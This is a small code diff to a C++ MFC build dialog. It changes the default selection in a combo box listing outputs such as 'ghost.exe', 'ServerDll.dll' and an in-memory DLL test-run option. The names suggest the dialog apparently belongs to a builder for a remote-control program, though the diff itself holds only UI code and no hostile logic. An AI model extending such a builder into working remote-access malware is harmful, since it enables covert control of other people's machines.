@@ -257,7 +257,7 @@ BOOL CBuildDlg::OnInitDialog()
 	m_ComboExe.InsertString(IndexGhost, "ghost.exe");
 	m_ComboExe.InsertString(IndexServerDll, "ServerDll.dll");
 	m_ComboExe.InsertString(OTHER_ITEM, CString("选择文件"));
-	m_ComboExe.SetCurSel(0);
+	m_ComboExe.SetCurSel(IndexTestRun_MemDLL);
 
 	m_ComboBits.InsertString(0, "64位");
 	m_ComboBits.InsertString(1, "32位");
